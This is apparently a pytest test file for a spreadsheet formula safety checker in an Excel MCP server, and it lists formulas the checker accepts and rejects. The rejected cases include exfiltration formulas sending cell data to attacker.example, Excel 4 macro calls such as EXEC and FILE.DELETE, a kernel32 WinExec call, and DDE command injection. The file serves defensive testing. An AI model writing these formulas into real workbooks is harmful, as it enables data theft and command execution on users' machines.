from pathlib import Path

import pytest

from excel_mcp.errors import InvalidFormulaError, UnsafeFormulaError
from excel_mcp.formulas import check_formula
from tests.conftest import ToolCall

pytestmark = pytest.mark.anyio

SHEETS = ["Sheet1", "Sheet2", "Sheet3", "My Sheet", "Data", "Q1.Sales", "Report.v2", "Wow!", "It's"]


@pytest.mark.parametrize(
    "formula",
    [
        "=SUM(A1:A10)",
        "=IF(B2>0,B2*1.2,0)",
        "=_xlfn.XLOOKUP(A2,Sheet2!A:A,Sheet2!B:B)",
        "=SUM(Table1[Sales])",
        "=Table1[[#This Row],[Units]]*2",
        "='My Sheet'!A1+1",
        "=SUM(Sheet1:Sheet3!A1)",
        "=SUM('Sheet1:My Sheet'!A1)",
        "='Q1.Sales'!A1+Report.v2!B2",
        "=sheet1!A1+DATA!B2",
        "=SUM(A1:INDEX(B:B,3))",
        "=Sheet1!A1:OFFSET(A1,2,0)",
        "=Sheet1!A1:Sheet1!B2",
        "=Table1[[Col1]:[Col2]]",
        "=[@Units]*2",
        # Columns PY, DDE and RTD share their names with blocked functions.
        "=SUM(PY:PY)+SUM(A:RTD)",
        "=Sheet1!DDE:DDE",
        "='Wow!'!A1+'It''s'!A1+Sheet1!#REF!",
        '="a|b"&A1',
        '=CONCAT("see ","https://example.com")',
        "=LET(x,A1*2,x+1)",
        # Reading the open workbook and the host cannot send anything out.
        '=INDIRECT("A"&B1)',
        '=SUM(A1:INDIRECT("B2"))+Sheet1!A1:INDIRECT("B2")',
        '=INDIRECT("R1C1",FALSE)',
        '=CELL("address",A1)&CELL("filename",A1)',
        '=INFO("osversion")',
        # Links are fine when they are fixed text.
        '=HYPERLINK("https://example.com/docs","Docs")',
        '=HYPERLINK("HTTP://example.com")',
        '=HYPERLINK("mailto:me@example.com?subject=Hi","Mail me")',
        '=HYPERLINK("#Sheet2!A1","Go")',
        "=HYPERLINK(\"#'My Sheet'!B2:C3\")",
        '=HYPERLINK("#MyName","Go")',
        # Names that look like macro functions are fine unless they are called.
        "=SUM(Files,Result,Run,Input,Windows,Names)*Hyperlink",
        "=Sheet1!Run+App.Total",
    ],
)
def test_safe_formulas_are_accepted(formula: str) -> None:
    check_formula(formula, SHEETS)


@pytest.mark.parametrize(
    "formula",
    [
        '=WEBSERVICE("https://attacker.example/?d="&A1)',
        '=webservice("https://attacker.example")',
        '=WebService("https://attacker.example")',
        '=_xlfn.WEBSERVICE("https://attacker.example")',
        '=FILTERXML(WEBSERVICE("https://x"),"//a")',
        '=IMAGE("https://tracker.example/pixel.png")',
        '=RTD("server",,"topic")',
        '=CALL("kernel32","WinExec","JCJ","calc",0)',
        "=SUM(IF(A1>0,WEBSERVICE(B1),0))",
        '=webservice ("https://attacker.example")',
        '=_xlfn.WEBSERVICE ("https://attacker.example")',
        '=IMPORTXML("https://attacker.example","//a")',
        '=importdata("https://attacker.example/?d="&A1)',
        '=@WEBSERVICE("https://attacker.example")',
        '=@_xlfn.IMAGE("https://attacker.example/p.png")',
        '=_xlfn._xlfn.WEBSERVICE("https://attacker.example")',
        '=_xlfn.MAP("https://attacker.example",_xleta.WEBSERVICE)',
        '=Sheet1!WEBSERVICE("https://attacker.example")',
        '=A1:WEBSERVICE("https://attacker.example")',
        '=A1:@_xlfn.WEBSERVICE("https://attacker.example")',
    ],
)
def test_dangerous_functions_are_rejected(formula: str) -> None:
    with pytest.raises(UnsafeFormulaError, match="not allowed"):
        check_formula(formula, SHEETS)


XLM_CALLS = [
    '=FILES("C:\\*")',
    "=DIRECTORY()",
    "=GET.WORKBOOK(1)",
    "=get.workbook(1)",
    "=GET.WINDOW(1)",
    "=GET.FORMULA(A1)",
    '=GET.NAME("x")',
    "=GET.DEF(1)",
    "=GET.OBJECT(1)",
    "=GET.CELL(5,A1)",
    "=GET.WORKSPACE(1)",
    "=DOCUMENTS(1)",
    "=WINDOWS(1)",
    "=NAMES()",
    '=FILE.EXISTS("C:\\x")',
    '=FILE.DELETE("C:\\x")',
    '=APP.TITLE("x")',
    '=SEND.KEYS("x")',
    '=RUN("macro")',
    "=HALT()",
    '=ALERT("x")',
    '=EXEC("calc.exe")',
    '=EVALUATE("1+1")',
    '=FOPEN("C:\\x")',
    '=WORKBOOK.ADD("x")',
    '=ON.TIME(1,"x")',
    '=SET.NAME("x",1)',
    '=DEFINE.NAME("x","=1")',
    '=OPEN("C:\\x.xlsx")',
    '=SAVE.AS("C:\\x.xlsx")',
    '=INITIATE("excel","x")',
    "=_xlfn.GET.WORKBOOK(1)",
    '=_xlfn._xlws.FILES("x")',
    '=@FILES("x")',
    '=Sheet1!FILES("x")',
    '=A1:FILES("x")',
    '=FILES ("x")',
    '=files ("x")',
    "=SUM(1,GET.WORKBOOK(1))",
    "=MAP(A1:A3,_xleta.GET.WORKBOOK)",
    "=MAP(A1:A3,_XLETA.FILES)",
]


@pytest.mark.parametrize("formula", XLM_CALLS)
def test_excel_4_macro_functions_are_rejected(formula: str) -> None:
    with pytest.raises(UnsafeFormulaError, match="macro function"):
        check_formula(formula, SHEETS)


@pytest.mark.parametrize(
    "formula",
    [
        "=HYPERLINK(A1)",
        '=HYPERLINK(A1,"x")',
        '=HYPERLINK("https://example.com/?d="&A1,"x")',
        '=HYPERLINK(CONCAT("https://","example.com"))',
        '=HYPERLINK("https://example.com"&A1)',
        '=HYPERLINK("file:///C:/x.exe","x")',
        r'=HYPERLINK("\\\\server\\share\\x","x")',
        '=HYPERLINK("C:\\x.exe")',
        '=HYPERLINK("ftp://example.com")',
        '=HYPERLINK(" https://example.com")',
        '=HYPERLINK("#[book.xlsx]Sheet1!A1")',
        r'=HYPERLINK("#C:\\x.xlsx!A1")',
        '=HYPERLINK("#Missing!A1")',
        '=HYPERLINK("#https://example.com")',
        '=HYPERLINK ("https://example.com/"&A1)',
        "=_xlfn.HYPERLINK(A1)",
        "=Sheet1!HYPERLINK(A1)",
        "=SUM(1,HYPERLINK(A1))",
    ],
)
def test_hyperlinks_must_be_literal_safe_links(formula: str) -> None:
    with pytest.raises(UnsafeFormulaError, match=r"HYPERLINK|other workbooks"):
        check_formula(formula, SHEETS)


@pytest.mark.parametrize(
    "formula",
    [
        "=[1]Sheet1!A1",
        "='C:\\data\\[secrets.xlsx]Sheet1'!A1",
        "=SUM([book.xlsx]Sheet1!A1:A3)",
        "=SUM([Book2.xlsx]Sheet1:Sheet3!A1)",
        "=[1]!Name",
        # Links to a defined name in another workbook have no brackets.
        "=SUM(Budget.xlsx!Sales)",
        "=Book1!Sales",
        r"='C:\Reports\Budget.xlsx'!Sales",
        r"='\\203.0.113.7\share\book.xlsx'!Sales",
        "='https://attacker.example/book.xlsx'!Sales",
        "='Macintosh HD:Users:me:Budget'!Sales",
        "=IF(A1>0,'Old Book.xls'!Total,0)",
        "=Budget.xlsx!A1:Sheet2!B2",
        "='Budget.xlsx'!#REF!",
        # A function in another workbook, or a reference that ends in a function call.
        r"='\\203.0.113.7\share\book.xlsm'!MyFunc()",
        "=Budget.xlsm!MyFunc(A1)",
        "=SUM([1]Sheet1!A1:OFFSET(A1,0,0))",
        # A sheet that does not exist is read as another workbook.
        "=Missing!A1",
        "=SUM(Sheet1:Missing!A1)",
    ],
)
def test_external_workbook_references_are_rejected(formula: str) -> None:
    with pytest.raises(UnsafeFormulaError, match="other workbooks"):
        check_formula(formula, SHEETS)


@pytest.mark.parametrize("formula", ["=cmd|' /C calc'!A0", "=cmd|'/c calc'!'A0'"])
def test_dde_is_rejected(formula: str) -> None:
    with pytest.raises((UnsafeFormulaError, InvalidFormulaError)):
        check_formula(formula, SHEETS)


def test_formula_must_start_with_equals() -> None:
    with pytest.raises(InvalidFormulaError, match="start with"):
        check_formula("SUM(A1)", SHEETS)


def test_unknown_sheet_error_lists_the_sheets() -> None:
    with pytest.raises(UnsafeFormulaError, match=r"'Q3' .* Sheets: 'Q1', 'Q2'"):
        check_formula("=Q3!A1", ["Q1", "Q2"])


async def test_macro_functions_are_refused_in_names_and_cells(
    call_error: ToolCall, call: ToolCall, sample: Path
) -> None:
    message = await call_error(
        "set_defined_name", path="sales.xlsx", name="listing", refers_to='FILES("C:/*")'
    )
    assert "macro function" in message
    message = await call_error(
        "write_range", path="sales.xlsx", sheet="Data", start_cell="F1", rows=[["=GET.WORKBOOK(1)"]]
    )
    assert "macro function" in message
    await call(
        "write_range",
        path="sales.xlsx",
        sheet="Data",
        start_cell="F1",
        rows=[['=HYPERLINK("https://example.com","Docs")', '=INDIRECT("A1")']],
    )
    assert "HYPERLINK" in await call_error(
        "write_range", path="sales.xlsx", sheet="Data", start_cell="F2", rows=[["=HYPERLINK(A2)"]]
    )


@pytest.mark.parametrize(
    "name",
    [
        "SQL.OPEN", "MAIL.LOGON", "QUERY.REFRESH", "SOLVER.LOAD", "VBA.MAKE.ADDIN", "SOUND.PLAY",
        "OPEN.TEXT", "SAVE.COPY.AS", "FWRITELN", "FSIZE", "UPDATE.LINK", "CHANGE.LINK", "LINKS",
        "TERMINATE", "REQUEST", "POKE", "PASTE.LINK", "CLOSE.ALL", "LIST.NAMES", "SCENARIO.GET",
        "INSERT.PICTURE", "ACTIVATE.NEXT", "REGISTER.ID", "SEND.MAIL", "WORKBOOK.TAB.SPLIT",
    ],
)  # fmt: skip
def test_more_macro_functions_are_rejected(name: str) -> None:
    with pytest.raises(UnsafeFormulaError, match="not allowed"):
        check_formula(f"={name}(1)", SHEETS)


def test_no_worksheet_function_is_taken_for_a_macro_function() -> None:
    from excel_mcp.calc.registry import FUNCTIONS
    from excel_mcp.xlm import is_macro_function

    assert not [name for name in FUNCTIONS if is_macro_function(name)]
    for name in ("ROW", "COLUMN", "SORT", "FILTER", "INDEX", "NOW", "CHAR", "TABLE", "TEXT"):
        assert not is_macro_function(name)
